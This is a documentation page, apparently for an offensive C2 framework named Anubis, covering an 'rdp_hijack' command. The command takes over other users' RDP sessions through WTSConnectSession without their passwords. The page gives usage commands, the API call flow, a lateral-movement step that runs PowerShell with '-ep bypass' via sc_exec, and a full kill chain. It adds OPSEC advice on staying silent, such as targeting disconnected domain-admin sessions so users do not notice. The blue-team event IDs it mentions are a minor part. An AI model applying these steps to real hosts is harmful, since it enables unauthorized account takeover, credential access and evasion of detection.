+++
title = "rdp_hijack"
chapter = false
weight = 130
hidden = false
+++

## Summary

Lists and hijacks active/disconnected **RDP sessions** on the local host without knowing the session owner's password. Uses `WTSConnectSession` from `wtsapi32.dll` directly — no `tscon.exe`.

- **Platform**: Windows only
- **Needs Admin**: No (but **requires SYSTEM** for WTSConnectSession)
- **MITRE ATT&CK**: T1563.002
- **Dependencies**: Pure ctypes (wtsapi32)
- **Version**: 1.0
- **Author**: @wtechsec

### Arguments

#### session_id *(optional)*
- RDP session ID to hijack. `0` or empty = list all sessions.

#### dest_session *(optional)*
- Destination session ID (where the hijacked desktop will appear). `-1` = auto-detect current session.

## Usage

```
# Modo list — enumera sessões
rdp_hijack

# Modo hijack — assume sessão 3 (domain admin desconectado)
rdp_hijack 3

# Hijack enviando para sessão destino específica
rdp_hijack 3 1
```

## Prerequisite: SYSTEM

`WTSConnectSession` requer `NT AUTHORITY\SYSTEM`. Fluxo típico:

```
# 1. No host comprometido A: implanta Anubis no host B como SYSTEM via sc_exec
sc_exec 192.168.1.10 "powershell -ep bypass -f C:\Windows\Temp\a.ps1"

# 2. No novo agente (SYSTEM) no host B: lista sessões
rdp_hijack

# Output esperado:
# ID    Station                State          User
# ─────────────────────────────────────────────────────────────────
# 0     Services               Idle
# 1     Console                Active         CORP\admin_ti
# 3     RDP-Tcp#2              Disconnected   CORP\jsmith     ◄
# 5     RDP-Tcp#4              Active         CORP\operador

# 3. Hijacka sessão 3 (domain admin desconectado — sem senha necessária)
rdp_hijack 3
```

## Technique Detail

```
List mode (session_id == 0):
  WTSEnumerateSessionsW(LOCAL, 0, 1, &ppInfo, &count)
  Para cada sessão:
    WTSQuerySessionInformationW(sid, WTSUserName   → username)
    WTSQuerySessionInformationW(sid, WTSDomainName → domain)
  → tabela: ID / WinStation / State / User

Hijack mode (session_id > 0):
  ProcessIdToSessionId(GetCurrentProcessId()) → my_session_id
  WTSConnectSession(
      LogonId       = target_session_id,   ← sessão a ser hijackada
      TargetLogonId = my_session_id,       ← destino (sessão do agente)
      Password      = L"",                 ← vazio → SYSTEM não precisa de senha
      bWait         = TRUE
  )
```

## MITRE ATT&CK Mapping

- **T1563.002** — Remote Service Session Hijacking: RDP Hijacking

## Notes

- **Sem tscon.exe:** implementação via `wtsapi32!WTSConnectSession` direto — não spawna `tscon.exe`.
- **Sessões Disconnected são o alvo ideal:** usuário fez logoff sem encerrar a sessão. Hijack é completamente silencioso para o usuário — ele não está ativo.
- **Sessões Active:** hijack funciona mas o usuário verá o cursor se mover e pode notar a atividade.
- **Sessão 0 (Services):** nunca é interativa no Windows Vista+. Ignore nas listagens.
- **Detecção (blue team):** Security Event ID **4778** (session reconnected), **4779** (session disconnected) no host — mas apenas se auditoria de logon estiver habilitada. Sysmon não cobre `WTSConnectSession` nativamente.
- **Artefato físico:** se o host tem tela física conectada, o monitor exibirá a sessão hijackada.

### Scenarios por tipo de sessão

| Estado | Risco para OPSEC | Técnica recomendada |
|---|---|---|
| Disconnected | Baixo — usuário offline | Hijack direto (`rdp_hijack <id>`) |
| Active (RDP) | Médio — usuário pode notar | Esperar sessão desconectar |
| Active (Console) | Alto — tela física exposta | Evitar, ou usar horário de manutenção |

### Full Kill Chain

```
# Fase 1: acesso inicial em HOST-A
# [token_steal → domain admin token]

# Fase 2: lateral para HOST-B (Win11 workstation)
sc_exec 192.168.1.10 "powershell -ep bypass -f C:\Windows\Temp\a.ps1"
# Anubis roda como SYSTEM no HOST-B

# Fase 3: no novo agente SYSTEM em HOST-B
rdp_hijack                # lista sessões
# → sessão 3: CORP\jsmith (Disconnected)

rdp_hijack 3              # hijacka sessão
# → desktop do jsmith aparece na sessão SYSTEM
# → acesso completo como domain user sem nova autenticação

# Fase 4: dentro da sessão hijackada
# Acesso a browsers, credential managers, mapped drives, VPNs...
# Sem deixar rastro de novo logon (não gera EID 4624 de logon interativo)
```

---

## Resumo em Português (PT-BR)

Hijacka sessões RDP ativas ou desconectadas no host local sem necessitar da senha do usuário. Ideal para assumir sessões de domain admins que esqueceram de fazer logoff.

### Requisito crítico: SYSTEM

O `WTSConnectSession` exige que o processo seja `NT AUTHORITY\SYSTEM`. Use `sc_exec` para implantar o agente como SYSTEM no host alvo antes de executar `rdp_hijack`.

### Por que sessões Disconnected são valiosas

Quando um domain admin se conecta via RDP e fecha a janela sem fazer logoff, a sessão permanece "Disconnected" com:
- Processos ativos no contexto do usuário
- Mapeamentos de rede mantidos
- Browsers com sessões autenticadas abertas
- Acesso a recursos de domínio sem nova autenticação

O hijack dessas sessões é silencioso — o usuário não recebe notificação.
